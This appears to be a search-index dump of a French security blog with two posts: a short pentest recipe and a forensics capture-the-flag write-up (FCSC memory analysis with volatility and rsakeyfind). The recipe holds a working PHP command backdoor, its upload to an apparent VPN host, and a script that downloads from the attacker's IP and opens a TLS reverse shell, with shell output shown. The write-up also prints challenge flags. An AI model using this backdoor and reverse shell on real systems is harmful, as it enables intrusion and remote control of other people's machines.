[{"categories":["Shorts"],"content":"Simple reverse shell using OpenSSL.","date":"2020-11-28","objectID":"maki.bzh/shorts/rtcpssl/","tags":["openssl","pentest","reverse shell"],"title":"Reverse shell via openssl","uri":"maki.bzh/shorts/rtcpssl/"},{"categories":["Shorts"],"content":"Création d’un Python HTTPS server from http.server import HTTPServer, SimpleHTTPRequestHandler import ssl httpd = HTTPServer(('0.0.0.0', 4443), SimpleHTTPRequestHandler) httpd.socket = ssl.wrap_socket(httpd.socket, certfile='./cert_serv.pem', server_side=True) httpd.serve_forever() Création du certificat TLS: openssl req -new -x509 -keyout cert_serv.pem -out cert_serv.pem -days 365 -nodes Utilisation: python2 ./https.py ","date":"2020-11-28","objectID":"maki.bzh/shorts/rtcpssl/:1:0","tags":["openssl","pentest","reverse shell"],"title":"Reverse shell via openssl","uri":"maki.bzh/shorts/rtcpssl/"},{"categories":["Shorts"],"content":"Code backdoor Fichier “back.php”: \u003c?php system(base64_decode($_POST['x'])); ?\u003e Test de la backdoor: (host) -\u003e docker run -v ${PWD}:/opt/src --rm -ti php:alpine /bin/ash (docker) -\u003e # ip a s eth0 23: eth0@if24: \u003cBROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN\u003e mtu 1500 qdisc noqueue state UP link/ether 02:42:ac:11:00:04 brd ff:ff:ff:ff:ff:ff inet 172.17.0.4/16 brd 172.17.255.255 scope global eth0 valid_lft forever preferred_lft forever (docker) -\u003e # cd opt/src /opt/src # php -S 0.0.0.0:1337 [Fri Feb 21 11:37:57 2020] PHP 7.4.2 Development Server (http://0.0.0.0:1337) started Envoi de la commande curl: (host) -\u003e curl -k http://172.17.0.4:1337/back.php -d \"x=`echo 'id' | base64`\" uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video) ","date":"2020-11-28","objectID":"maki.bzh/shorts/rtcpssl/:2:0","tags":["openssl","pentest","reverse shell"],"title":"Reverse shell via openssl","uri":"maki.bzh/shorts/rtcpssl/"},{"categories":["Shorts"],"content":"Exploitation de la RCE et upload de la backdoor Lancer le serveur python https: python ./https.py Avec le tool de mpgn: (host) -\u003e command \u003e curl -k https://192.168.55.1:4443/back.php -o /var/vpn/themes/back.php [+] Adding bookmark 7QDFBBVO4SZ9.xml [+] Bookmark added [+] Result of the command: Trigger de la backdoor: (host) -\u003e curl -k https://192.168.55.123/vpn/themes/back.php -d \"x=$(echo 'id' | base64)\" uid=65534(nobody) gid=65534(nobody) groups=65534(nobody) ","date":"2020-11-28","objectID":"maki.bzh/shorts/rtcpssl/:3:0","tags":["openssl","pentest","reverse shell"],"title":"Reverse shell via openssl","uri":"maki.bzh/shorts/rtcpssl/"},{"categories":["Shorts"],"content":"Reverse shell openssl Check si openssl est installé: (host) -\u003e curl -k https://192.168.55.123/vpn/themes/back.php -d \"x=$(echo 'which openssl' | base64)\" /usr/bin/openssl Génération d’une paire de clé pour le rev shell: openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout priv.key -out cert.crt Copie du certificat dans le dossier du serveur https: cp cert.crt PATH/TO/https Ouverture de la socket openssl: openssl s_server -quiet -key priv.key -cert ../https/cert.crt -port 8443 Script pour trig le reverse shell openssl #!/bin/sh IP_ATTACKER=\"192.168.55.1\" REMOTE_CRT_PATH=\"/var/vpn/themes/cert.crt\" OPENSSL_PATH=$(which openssl) curl -k https://${IP_ATTACKER}:4443/cert.crt -o ${REMOTE_CRT_PATH} mkfifo /tmp/s; /bin/sh -i \u003c /tmp/s 2\u003e\u00261 | ${OPENSSL_PATH} s_client -quiet -CAfile ${REMOTE_CRT_PATH} -verify_return_error -verify 1 -connect ${IP_ATTACKER}:8443 \u003e /tmp/s; rm /tmp/s Trigger du rev shell TLS: (host) -\u003e curl -k https://192.168.55.123/vpn/themes/back.php -d \"x=$(echo 'curl -k https://192.168.55.1:4443/revopenssl.sh | bash' | base64)\" Dans le terminal avec le openssl en attente: (host) -\u003e openssl s_server -quiet -key priv.key -cert ../https/cert.crt -port 8443 sh: can't access tty; job control turned off (citrix) -\u003e $ id uid=65534(nobody) gid=65534(nobody) groups=65534(nobody) ","date":"2020-11-28","objectID":"maki.bzh/shorts/rtcpssl/:4:0","tags":["openssl","pentest","reverse shell"],"title":"Reverse shell via openssl","uri":"maki.bzh/shorts/rtcpssl/"},{"categories":["Writeups"],"content":"C’est la rentrée Bienvenue à l’académie de l’investigation numérique ! Votre mission, valider un maximum d’étapes de cette série afin de démontrer votre dextérité en analyse mémoire GNU/Linux. Première étape : retrouvez le HOSTNAME, le nom de l’utilisateur authentifié lors du dump et la version de Linux sur lequel le dump a été fait. Format du flag : FCSC{hostname:user:x.x.x-x-amdxx} ","date":"2020-06-27","objectID":"maki.bzh/writeups/fcscfrench2020academie/:1:0","tags":["anssi","fcsc","forensic","volatility","memory analysis","keepass","chrome"],"title":"[French FCSC] - Académie","uri":"maki.bzh/writeups/fcscfrench2020academie/"},{"categories":["Writeups"],"content":"TL;DR Cette suite de challenge se base sur le même dump mémoire. Le premier consiste à se rendre compte que c’est un dump Linux. ","date":"2020-06-27","objectID":"maki.bzh/writeups/fcscfrench2020academie/:1:1","tags":["anssi","fcsc","forensic","volatility","memory analysis","keepass","chrome"],"title":"[French FCSC] - Académie","uri":"maki.bzh/writeups/fcscfrench2020academie/"},{"categories":["Writeups"],"content":"État des lieux La première chose que je fais sur un dump mémoire pour un challenge, c’est de faire deux strings: ➜ strings dmp.mem \u003e str_dmp.txt ➜ strings -e l dmp.mem \u003e str_el_dmp.txt Pour ce challenge, on n’aura pas besoin de plus. ","date":"2020-06-27","objectID":"maki.bzh/writeups/fcscfrench2020academie/:1:2","tags":["anssi","fcsc","forensic","volatility","memory analysis","keepass","chrome"],"title":"[French FCSC] - Académie","uri":"maki.bzh/writeups/fcscfrench2020academie/"},{"categories":["Writeups"],"content":"Hostname ➜ cat str_* | grep \"HOSTNAME=\" XAUTHLOCALHOSTNAME= _HOSTNAME=challenge.fcsc challenge.fcsc ","date":"2020-06-27","objectID":"maki.bzh/writeups/fcscfrench2020academie/:1:3","tags":["anssi","fcsc","forensic","volatility","memory analysis","keepass","chrome"],"title":"[French FCSC] - Académie","uri":"maki.bzh/writeups/fcscfrench2020academie/"},{"categories":["Writeups"],"content":"User ➜ cat str_* | grep -Eo \"^/home/.*/$\" /home/Lesage/.mozilla/firefox/peyjyk3f.default-esr/extensions/ /home/Lesage/.local/share/mime/ /home/Lesage/.mozilla/firefox/peyjyk3f.default-esr/extensions/ /home/Lesage/.mozilla/firefox/peyjyk3f.default-esr/extensions/ /home/Lesage/.local/share/mime/ /home/Lesage/.local/share/mime/ /home/Lesage/Documents/temp/ ➜ cat str_* | grep \"USER=\" | sort | uniq USER=Lesage [...] Lesage ","date":"2020-06-27","objectID":"maki.bzh/writeups/fcscfrench2020academie/:1:4","tags":["anssi","fcsc","forensic","volatility","memory analysis","keepass","chrome"],"title":"[French FCSC] - Académie","uri":"maki.bzh/writeups/fcscfrench2020academie/"},{"categories":["Writeups"],"content":"Version kernel ➜ cat str_* | grep 'Linux version' | uniq Linux version 5.4.0-4-amd64 (debian-kernel@lists.debian.org) (gcc version 9.2.1 20200203 (Debian 9.2.1-28)) #1 SMP Debian 5.4.19-1 (2020-02-13) ➜ cat str_* | grep \"BOOT_IMAGE=\" BOOT_IMAGE=/boot/vmlinuz-5.4.0-4-amd64 root=UUID=536c82dd-f1c5-43ce-b65d-c94e5c4a5031 ro quiet [...] 5.4.0-4-amd64 ","date":"2020-06-27","objectID":"maki.bzh/writeups/fcscfrench2020academie/:1:5","tags":["anssi","fcsc","forensic","volatility","memory analysis","keepass","chrome"],"title":"[French FCSC] - Académie","uri":"maki.bzh/writeups/fcscfrench2020academie/"},{"categories":["Writeups"],"content":"Flag FCSC{challenge.fcsc:Lesage:5.4.0-4-amd64} ","date":"2020-06-27","objectID":"maki.bzh/writeups/fcscfrench2020academie/:1:6","tags":["anssi","fcsc","forensic","volatility","memory analysis","keepass","chrome"],"title":"[French FCSC] - Académie","uri":"maki.bzh/writeups/fcscfrench2020academie/"},{"categories":["Writeups"],"content":"Administration Ce poste administre un serveur distant avec le protocole SSH à l’aide d’une authentification par clé (clé protégée par mot de passe). La clé publique a été utilisée pour chiffrer le message ci-joint (flag.txt.enc). Retrouvez et reconstituez la clé en mémoire qui permettra de déchiffrer ce message. ","date":"2020-06-27","objectID":"maki.bzh/writeups/fcscfrench2020academie/:2:0","tags":["anssi","fcsc","forensic","volatility","memory analysis","keepass","chrome"],"title":"[French FCSC] - Académie","uri":"maki.bzh/writeups/fcscfrench2020academie/"},{"categories":["Writeups"],"content":"TL;DR Pour ce challenge il n’y a pas non plus besoin de générer un profil volatility. En effet, le fichier chiffré a une taille de 2048 bits et l’énoncé parle de SSH. Donc on cherche une clé privée RSA, pour cela il existe rsakeyfind qui nous donne “d” et “n”. Ces informations permettent de déchiffrer le flag. ","date":"2020-06-27","objectID":"maki.bzh/writeups/fcscfrench2020academie/:2:1","tags":["anssi","fcsc","forensic","volatility","memory analysis","keepass","chrome"],"title":"[French FCSC] - Académie","uri":"maki.bzh/writeups/fcscfrench2020academie/"},{"categories":["Writeups"],"content":"État de l’art On commence le challenge avec un fichier chiffré “SSH”. Intuitivement, on peut penser à du RSA, mais il existe plusieurs algorithmes disponibles. Pour s’en assurer, il suffit de vérifier la taille du fichier chiffré: ➜ cat flag.txt.enc| wc -c 256 # 256*8 = 2048 On peut se dire qu’on cherche une clé privée RSA. ","date":"2020-06-27","objectID":"maki.bzh/writeups/fcscfrench2020academie/:2:2","tags":["anssi","fcsc","forensic","volatility","memory analysis","keepass","chrome"],"title":"[French FCSC] - Académie","uri":"maki.bzh/writeups/fcscfrench2020academie/"},{"categories":["Writeups"],"content":"Récupérer la clé privée L’outil rsakeyfind : https://github.com/congwang/rsakeyfind ➜ ~/tools/forensic/rsakeyfind/rsakeyfind dmp.mem FOUND PRIVATE KEY AT c64ac50 version = 00 modulus = 00 d7 1e 77 82 8c 92 31 e7 69 02 a2 d5 5c 78 de a2 0c 8f fe 28 59 31 df 40 9c 60 61 06 b9 2f 62 40 80 76 cb 67 4a b5 59 56 69 17 07 fa f9 4c bd 6c 37 7a 46 7d 70 a7 67 22 b3 4d 7a 94 c3 ba 4b 7c 4b a9 32 7c b7 38 95 45 64 a4 05 a8 9f 12 7c 4e c6 c8 2d 40 06 30 f4 60 a6 91 bb 9b ca 04 79 11 13 75 f0 ae d3 51 89 c5 74 b9 aa 3f b6 83 e4 78 6b cd f9 5c 4c 85 ea 52 3b 51 93 fc 14 6b 33 5d 30 70 fa 50 1b 1b 38 81 13 8d f7 a5 0c c0 8e f9 63 52 18 4e a9 f9 f8 5c 5d cd 7a 0d d4 8e 7b ee 91 7b ad 7d b4 92 d5 ab 16 3b 0a 8a ce 8e de 47 1a 17 01 86 7b ab 99 f1 4b 0c 3a 0d 82 47 c1 91 8c bb 2e 22 9e 49 63 6e 02 c1 c9 3a 9b a5 22 1b 07 95 d6 10 02 50 fd fd d1 9b be ab c2 c0 74 d7 ec 00 fb 11 71 cb 7a dc 81 79 9f 86 68 46 63 82 4d b7 f1 e6 16 6f 42 63 f4 94 a0 ca 33 cc 75 13 publicExponentprivateExponent = 62 b5 60 31 4f 3f 66 16 c1 60 ac 47 2a ff 6b 69 00 4a b2 5c e1 50 b9 18 74 a8 e4 dc a8 ec cd 30 bb c1 c6 e3 c6 ac 20 2a 3e 5e 8b 12 e6 82 08 09 38 0b ab 7c b3 cc 9c ce 97 67 dd ef 95 40 4e 92 e2 44 e9 1d c1 14 fd a9 b1 dc 71 9c 46 21 bd 58 88 6e 22 15 56 c1 ef e0 c9 8d e5 80 3e da 7e 93 0f 52 f6 f5 c1 91 90 9e 42 49 4f 8d 9c ba 38 83 e9 33 c2 50 4f ec c2 f0 a8 b7 6e 28 25 56 6b 62 67 fe 08 f1 56 e5 6f 0e 99 f1 e5 95 7b ef eb 0a 2c 92 97 57 23 33 36 07 dd fb ae f1 b1 d8 33 b7 96 71 42 36 c5 a4 a9 19 4b 1b 52 4c 50 69 91 f0 0e fa 80 37 4b b5 d0 2f b7 44 0d d4 f8 39 8d ab 71 67 59 05 88 3d eb 48 48 33 88 4e fe f8 27 1b d6 55 60 5e 48 b7 6d 9a a8 37 f9 7a de 1b cd 5d 1a 30 d4 e9 9e 5b 3c 15 f8 9c 1f da d1 86 48 55 ce 83 ee 8e 51 c7 de 32 12 47 7d 46 b8 35 df 41 prime1 = 00 prime2 = 00 exponent1 = 00 exponent2 = 00 coefficient = 00 ","date":"2020-06-27","objectID":"maki.bzh/writeups/fcscfrench2020academie/:2:3","tags":["anssi","fcsc","forensic","volatility","memory analysis","keepass","chrome"],"title":"[French FCSC] - Académie","uri":"maki.bzh/writeups/fcscfrench2020academie/"},{"categories":["Writeups"],"content":"Déchiffrer le fichier Il suffit d’utiliser ’d’, ’n’ et le fichier “flag.txt.enc” pour récupérer le flag: ➜ cat flag.txt.enc | xxd -p | tr -d '\\n' 6da249ada8a979ed289b249d9ed4af472bda2ebbd1d9ea8b63f927f9bf91ba1bb76c378e6e62f07b7717f1e1def03dd65a8c6ee3ce40447d12f7b07ad2d18256a3997bd5786cccfaa678b1f60b069e6b8ccc70eb6948c3624eaf7832727bd034c9964c7dd863830d3b07bc4b242c4fe0ead36ae7a81ff1419b658b86dd30d78acc797f5b7a2b5c08d3fc807fbcd9e61e7f46071cdc3906882b9084e9af9231c4b343fbac2349232d368b0d343f6e9e2c7ff32242e1885590fdfe762ce8658c684c04ea19b8bf7b5153c4a4cdfbd5847da3b53fc285469b7761a5da6f1778b8972da6006d279a8042bbfaa7045ec72bf778f24d6da5fe1fde422667bc9c53f77d d = int(0xd71e77828c9231e76902a2d55c78dea20c8ffe285931df409c606106b92f62408076cb674ab55956691707faf94cbd6c377a467d70a76722b34d7a94c3ba4b7c4ba9327cb738954564a405a89f127c4ec6c82d400630f460a691bb9bca0479111375f0aed35189c574b9aa3fb683e4786bcdf95c4c85ea523b5193fc146b335d3070fa501b1b3881138df7a50cc08ef96352184ea9f9f85c5dcd7a0dd48e7bee917bad7db492d5ab163b0a8ace8ede471a1701867bab99f14b0c3a0d8247c1918cbb2e229e49636e02c1c93a9ba5221b0795d6100250fdfdd19bbeabc2c074d7ec00fb1171cb7adc81799f86684663824db7f1e6166f4263f494a0ca33cc7513) n = int(0x62b560314f3f6616c160ac472aff6b69004ab25ce150b91874a8e4dca8eccd30bbc1c6e3c6ac202a3e5e8b12e6820809380bab7cb3cc9cce9767ddef95404e92e244e91dc114fda9b1dc719c4621bd58886e221556c1efe0c98de5803eda7e930f52f6f5c191909e42494f8d9cba3883e933c2504fecc2f0a8b76e2825566b6267fe08f156e56f0e99f1e5957befeb0a2c92975723333607ddfbaef1b1d833b796714236c5a4a9194b1b524c506991f00efa80374bb5d02fb7440dd4f8398dab71675905883deb484833884efef8271bd655605e48b76d9aa837f97ade1bcd5d1a30d4e99e5b3c15f89c1fdad1864855ce83ee8e51c7de3212477d46b835df41) c = int(0x6da249ada8a979ed289b249d9ed4af472bda2ebbd1d9ea8b63f927f9bf91ba1bb76c378e6e62f07b7717f1e1def03dd65a8c6ee3ce40447d12f7b07ad2d18256a3997bd5786cccfaa678b1f60b069e6b8ccc70eb6948c3624eaf7832727bd034c9964c7dd863830d3b07bc4b242c4fe0ead36ae7a81ff1419b658b86dd30d78acc797f5b7a2b5c08d3fc807fbcd9e61e7f46071cdc3906882b9084e9af9231c4b343fbac2349232d368b0d343f6e9e2c7ff32242e1885590fdfe762ce8658c684c04ea19b8bf7b5153c4a4cdfbd5847da3b53fc285469b7761a5da6f1778b8972da6006d279a8042bbfaa7045ec72bf778f24d6da5fe1fde422667bc9c53f77d) t = pow(c,d,n) print(hex(t)) # Output : 0x22681c036dd635f46c2853e08b7359b196e5db09f3fa40a801704b36f7408c8ed931f29ff4319a7ba0be6e107624a43471d49cc14bb0e71488c76230de112bb05f7821bc81f67db4c80fd038938bfc7fed1e963b3e9adb27bd127948b1d9bb3874b1bc320e90628a991bc066dc4406830133627cb148370d14d9538ff238d12f002bc89233daa0beda1ca2c5bc714087ef808624e5b4ed1e9b62bb6f6a34c88907381f1606de98951ba3733bf8d426e310417b61e394300464353437b616335636164363631313464343836366134623535653433636238383936636334393437383535323431623561663864326638613132336333363038336439387d0a ➜ echo -n '022681c036dd635f46c2853e08b7359b196e5db09f3fa40a801704b36f7408c8ed931f29ff4319a7ba0be6e107624a43471d49cc14bb0e71488c76230de112bb05f7821bc81f67db4c80fd038938bfc7fed1e963b3e9adb27bd127948b1d9bb3874b1bc320e90628a991bc066dc4406830133627cb148370d14d9538ff238d12f002bc89233daa0beda1ca2c5bc714087ef808624e5b4ed1e9b62bb6f6a34c88907381f1606de98951ba3733bf8d426e310417b61e394300464353437b616335636164363631313464343836366134623535653433636238383936636334393437383535323431623561663864326638613132336333363038336439387d0a' | xxd -r -p | strings -n 10 FCSC{ac5cad66114d4866a4b55e43cb8896cc4947855241b5af8d2f8a123c36083d98} ","date":"2020-06-27","objectID":"maki.bzh/writeups/fcscfrench2020academie/:2:4","tags":["anssi","fcsc","forensic","volatility","memory analysis","keepass","chrome"],"title":"[French FCSC] - Académie","uri":"maki.bzh/writeups/fcscfrench2020academie/"},{"categories":["Writeups"],"content":"Flag FCSC{ac5cad66114d4866a4b55e43cb8896cc4947855241b5af8d2f8a123c36083d98} ","date":"2020-06-27","objectID":"maki.bzh/writeups/fcscfrench2020academie/:2:5","tags":["anssi","fcsc","forensic","volatility","memory analysis","keepass","chrome"],"title":"[French FCSC] - Académie","uri":"maki.bzh/writeups/fcscfrench2020academie/"},{"categories":["Writeups"],"content":"Premiers artéfacts Pour avancer dans l’analyse, vous devez retrouver : Le nom de processus ayant le PID 1254. La commande exacte qui a été exécutée le 2020-03-26 23:29:19 UTC. Le nombre d’IP-DST unique en communications TCP établies (état ESTABLISHED) lors du dump. Format du flag : FCSC{nom_du_processus:une_commande:n} ","date":"2020-06-27","objectID":"maki.bzh/writeups/fcscfrench2020academie/:3:0","tags":["anssi","fcsc","forensic","volatility","memory analysis","keepass","chrome"],"title":"[French FCSC] - Académie","uri":"maki.bzh/writeups/fcscfrench2020academie/"},{"categories":["Writeups"],"content":"TL;DR Ce challenge va nécessiter le profil Linux associé. Pour cela on se sert des snapshot Debian de Sid à la bonne date pour récupérer le bon kernel. Une fois le profil généré, il suffit d’utiliser les plugins linux_psscan, linux_bash et linux_netscan. ","date":"2020-06-27","objectID":"maki.bzh/writeups/fcscfrench2020academie/:3:1","tags":["anssi","fcsc","forensic","volatility","memory analysis","keepass","chrome"],"title":"[French FCSC] - Académie","uri":"maki.bzh/writeups/fcscfrench2020academie/"},{"categories":["Writeups"],"content":"État de l’art Ce challenge annonce le début des ennuis. En effet, il va falloir créer un profil volatility pour pouvoir récupérer ces informations. En temps normal, créer un profil sur un Debian, c’est plutôt très simple (cf. Un poc en bash d’automatisation que j’avais fait : https://github.com/Zeecka/Auto_vol). Le souci principal va être de trouver la bonne version de Kernel. Grâce au challenge précédent, on sait que le kernel est de version : 5.4.0-4-amd64. Qui dit très récent, va dire très casse-pied. ","date":"2020-06-27","objectID":"maki.bzh/writeups/fcscfrench2020academie/:3:2","tags":["anssi","fcsc","forensic","volatility","memory analysis","keepass","chrome"],"title":"[French FCSC] - Académie","uri":"maki.bzh/writeups/fcscfrench2020academie/"},{"categories":["Writeups"],"content":"Génération du profil La version est: ➜ cat str_* | grep 'Linux version' | uniq Linux version 5.4.0-4-amd64 (debian-kernel@lists.debian.org) (gcc version 9.2.1 20200203 (Debian 9.2.1-28)) #1 SMP Debian 5.4.19-1 (2020-02-13) Deux informations intéressantes: Kernel : 5.4.0-4-amd64 Date : 2020-02-13 Avec cette date, il est possible de trouver un snapshot précis des dépôts Debian sur : https://snapshot.debian.org/ La première étape est de créer une VM Debian: https://cdimage.debian.org/debian-cd/current/amd64/bt-cd/debian-10.3.0-amd64-netinst.iso.torrent Lorsque la machine est installée, un simple uname -a montre qu’on a pas du tout la bonne version de kernel. C’est là que les snapshots Debian seront utiles. Avec un peu de recherche, on trouve ces dépôts: deb [check-valid-until=no] https://snapshot.debian.org/archive/debian/20200213T231921Z/ sid main contrib non-free deb-src [check-valid-until=no] https://snapshot.debian.org/archive/debian/20200213T231921Z/ sid main contrib non-free Donc en l’ajoutant dans notre /etc/apt/sources.list, on peut faire une recherche, et là: user@debian:~$ apt search linux-headers En train de trier... Fait Recherche en texte intégral... Fait [...] linux-headers-5.4.0-4-amd64/unstable,now 5.4.19-1 amd64 Header files for Linux 5.4.0-4-amd64 [...] user@debian:~$ apt search linux-image En train de trier... Fait Recherche en texte intégral... Fait [...] linux-image-5.4.0-4-amd64-unsigned/unstable,now 5.4.19-1 amd64 Linux 5.4 for 64-bit PCs [...] Oook boy, il est temps d’installer ce qu’il nous faut: root@debian:/home/user# apt install linux-headers-5.4.0-4-amd64 linux-image-5.4.0-4-amd64-unsigned volatility-tools Une fois le tout installé, il faut redémarrer la machine et boot sur le bon kernel (grub est plutôt intuitif pour ça): user@debian:~$ uname -a Linux debian 5.4.0-4-amd64 #1 SMP Debian 5.4.19-1 (2020-02-13) x86_64 GNU/Linux Ca a une bonne tête. Il est temps de créer le profil (cf. https://www.maki.bzh/walkthrough/santhacklaus2018/#mission-impossible-1). root@debian:/home/user# cd /usr/src/volatility-tools/linux/ root@debian:/usr/src/volatility-tools/linux# make [...BLABLABLA MAKE BLABLALBA] root@debian:/usr/src/volatility-tools/linux# zip ecsc_deb540.zip /usr/src/volatility-tools/linux/module.dwarf /boot/System.map-5.4.0-4-amd64 adding: usr/src/volatility-tools/linux/module.dwarf (deflated 91%) adding: boot/System.map-5.4.0-4-amd64 (deflated 79%) Aller maintenant on le met dans un dossier accessible par volatility (j’utilise volatility en docker, pour être sur que les dépendances pètent pas, genre yara: https://github.com/makim0n/infosec-docker/tree/master/forensic/volatility). Donc j’ai mis le profil ecsc_deb540.zip dans le dossier de /opt/plug_vol de mon docker: ➜ python volatility/vol.py --plugins=/opt/plug_vol/ -f /opt/usr_land/dmp.mem --info | grep ecsc Linuxecsc_deb540x64 - A Profile for Linux ecsc_deb540 x64 Linuxecsc_deb540x64 Aller, c’est le moment le plus stressant: faut tester que ça marche. ➜ python volatility/vol.py --plugins=/opt/plug_vol/ -f /opt/usr_land/dmp.mem --profile=Linuxecsc_deb540x64 linux_banner Linux version 5.4.0-4-amd64 (debian-kernel@lists.debian.org) (gcc version 9.2.1 20200203 (Debian 9.2.1-28)) #1 SMP Debian 5.4.19-1 (2020-02-13) ","date":"2020-06-27","objectID":"maki.bzh/writeups/fcscfrench2020academie/:3:3","tags":["anssi","fcsc","forensic","volatility","memory analysis","keepass","chrome"],"title":"[French FCSC] - Académie","uri":"maki.bzh/writeups/fcscfrench2020academie/"},{"categories":["Writeups"],"content":"Nom du processus 1254 Maintenant que le profil est créé, en temps normal je fais un linux_pstree, mais ici ça ne semble pas aider beaucoup: ➜ python volatility/vol.py --plugins=/opt/plug_vol/ -f /opt/usr_land/dmp.mem --profile=Linuxecsc_deb540x64 linux_pstree \u003e /opt/usr_land/linux_pstree ➜ cat linux_pstree| grep 1254 # Pas de retour, c'est fâcheux. Donc là, pas le choix, on sort la doc: https://github.com/volatilityfoundation/volatility/wiki/Linux-Command-Reference On voit le plugin linux_psslit: ➜ python volatility/vol.py --plugins=/opt/plug_vol/ -f /opt/usr_land/dmp.mem --profile=Linuxecsc_deb540x64 linux_pslist \u003e /opt/usr_land/pslist ➜ cat pslist| grep 1254 # Pas de retour encore une fois, c'est fâcheux. Je me rappelle ce qu’un ancien collègue et sensei du forensic (@AZobec \u003c3) m’avais dit: Volatility c’est bien, mais la doc c’est le code, donc creuse quand tu trouves pas Donc on part pour le github de volatility dans le dossier des plugins: https://github.com/volatilityfoundation/volatility/tree/master/volatility/plugins/linux Ce plugin n’est pas du tout présent dans la command reference. ➜ python volatility/vol.py --plugins=/opt/plug_vol/ -f /opt/usr_land/dmp.mem --profile=Linuxecsc_deb540x64 linux_psscan \u003e /opt/usr_land/psscan ➜ cat psscan| grep 1254 0x000000003fdccd80 pool-xfconfd 1254 - -1 -1 0x0fd08ee88ee08ec0 - Enfin: pool-xfconfd ","date":"2020-06-27","objectID":"maki.bzh/writeups/fcscfrench2020academie/:3:4","tags":["anssi","fcsc","forensic","volatility","memory analysis","keepass","chrome"],"title":"[French FCSC] - Académie","uri":"maki.bzh/writeups/fcscfrench2020academie/"},{"categories":["Writeups"],"content":"La commande exécutée Les commandes exécutées par l’utilisateur sont plus simples à trouver: ➜ python volatility/vol.py --plugins=/opt/plug_vol/ -f /opt/usr_land/dmp.mem --profile=Linuxecsc_deb540x64 linux_bash \u003e /opt/usr_land/linux_bash ➜ cat linux_bash Pid Name Command Time Command -------- -------------------- ------------------------------ ------- [...] 1523 bash 2020-03-26 23:29:19 UTC+0000 nmap -sS -sV 10.42.42.0/24 [...] nmap -sS -sV 10.42.42.0/24 D’ailleurs, quitte à rester dans “la doc c’est le code”, il existe des arguments pour les plugins volatility, qui ne sont pas forcément documentés: https://github.com/volatilityfoundation/volatility/blob/master/volatility/plugins/linux/bash.py Ici, ça ne sert à rien, mais c’est bon à savoir. ","date":"2020-06-27","objectID":"maki.bzh/writeups/fcscfrench2020academie/:3:5","tags":["anssi","fcsc","forensic","volatility","memory analysis","keepass","chrome"],"title":"[French FCSC] - Académie","uri":"maki.bzh/writeups/fcscfrench2020academie/"},{"categories":["Writeups"],"content":"Nombre de connexion Pour le nombre de connexions, on sait que ce sont les connexions “établies”. Avec mon super niveau en anglais, “Peer connections” j’étais pas sur de ce que c’était, mais la commande ss de mon système m’a aidée: ➜ ss | head -n 2 Netid State Recv-Q Send-Q Local Address:Port Peer Address:Port u_str ESTAB 0 0 * 178269 * 180308 Ce sont donc les adresses de destinations. Il existe un plugin pour lister les connexions lors du dump: linux_netscan. ➜ python volatility/vol.py --plugins=/opt/plug_vol/ -f /opt/usr_land/dmp.mem --profile=Linuxecsc_deb540x64 linux_netscan \u003e /opt/usr_land/netscan ➜ cat netscan | grep ESTA 9d72830a8000 TCP 10.42.42.131 :58772 185.199.111.154 : 443 ESTABLISHED 9d72830a88c0 TCP 10.42.42.131 :45652 35.190.72.21 : 443 ESTABLISHED 9d72830a9a40 TCP 10.42.42.131 :53190 104.124.192.89 : 443 ESTABLISHED 9d72830abd40 TCP 10.42.42.131 :55226 151.101.121.140 : 443 ESTABLISHED 9d72830ad780 TCP 10.42.42.131 :50612 104.93.255.199 : 443 ESTABLISHED 9d72830af1c0 TCP 10.42.42.131 :38184 216.58.213.142 : 443 ESTABLISHED 9d7284eba300 TCP 10.42.42.131 :37252 163.172.182.147 : 443 ESTABLISHED 9d7284fe9180 TCP 127.0.0.1 :38498 127.0.0.1 :34243 ESTABLISHED 9d7284fe9a40 TCP 10.42.42.131 :57000 10.42.42.134 : 22 ESTABLISHED 9d7284feb480 TCP 10.42.42.131 :51858 10.42.42.128 : 445 ESTABLISHED 9d7284fef1c0 TCP 10.42.42.131 :55224 151.101.121.140 : 443 ESTABLISHED 9d7293778000 TCP 10.42.42.131 :47100 216.58.206.226 : 443 ESTABLISHED 9d729377cec0 TCP 10.42.42.131 :47106 216.58.206.226 : 443 ESTABLISHED 9d72c0acb480 TCP 10.42.42.131 :36970 116.203.52.118 : 443 ESTABLISHED 9d72c1503d40 TCP 127.0.0.1 :34243 127.0.0.1 :38498 ESTABLISHED 9d72c1bc1280 TCP fd:6663:7363:1000:c10b:6374:25f:dc37:36280 fd:6663:7363:1000:55cf:b9c6:f41d:cc24:58014 ESTABLISHED 9d72c23fcec0 TCP 10.42.42.131 :38186 216.58.213.142 : 443 ESTABLISHED 9d72c23fe040 TCP 10.42.42.131 :47104 216.58.206.226 : 443 ESTABLISHED 9d72c23fe900 TCP 10.42.42.131 :47102 216.58.206.226 : 443 ESTABLISHED Avec un peu de formating pour garder uniquement les IPs sortantes, on tombe sur: ➜ echo -n '185.199.111.154 35.190.72.21 104.124.192.89 151.101.121.140 104.93.255.199 216.58.213.142 163.172.182.147 127.0.0.1 10.42.42.134 10.42.42.128 151.101.121.140 216.58.206.226 216.58.206.226 116.203.52.118 127.0.0.1 216.58.213.142 216.58.206.226 216.58.206.226 fd:6663:7363:1000:55cf:b9c6:f41d:cc24:58014 ' | tr -d ' ' | sort | uniq | wc -l 13 13 ","date":"2020-06-27","objectID":"maki.bzh/writeups/fcscfrench2020academie/:3:6","tags":["anssi","fcsc","forensic","volatility","memory analysis","keepass","chrome"],"title":"[French FCSC] - Académie","uri":"maki.bzh/writeups/fcscfrench2020academie/"},{"categories":["Writeups"],"content":"Flag Challenge enfin terminé. FCSC{pool-xfconfd:nmap -sS -sV 10.42.42.0/24:13} ","date":"2020-06-27","objectID":"maki.bzh/writeups/fcscfrench2020academie/:3:7","tags":["anssi","fcsc","forensic","volatility","memory analysis","keepass","chrome"],"title":"[French FCSC] - Académie","uri":"maki.bzh/writeups/fcscfrench2020academie/"},{"categories":["Writeups"],"content":"Porte dérobée Un poste distant est connecté au poste en cours d’analyse via une porte dérobée avec la capacité d’exécuter des commandes. Quel est le numéro de port à l’écoute de cette connexion ? Quelle est l’adresse IP distante connectée au moment du dump ? Quel est l’horodatage de la création du processus en UTC de cette porte dérobée ? Format du flag : FCSC{port:IP:YYYY-MM-DD HH:MM:SS} ","date":"2020-06-27","objectID":"maki.bzh/writeups/fcscfrench2020academie/:4:0","tags":["anssi","fcsc","forensic","volatility","memory analysis","keepass","chrome"],"title":"[French FCSC] - 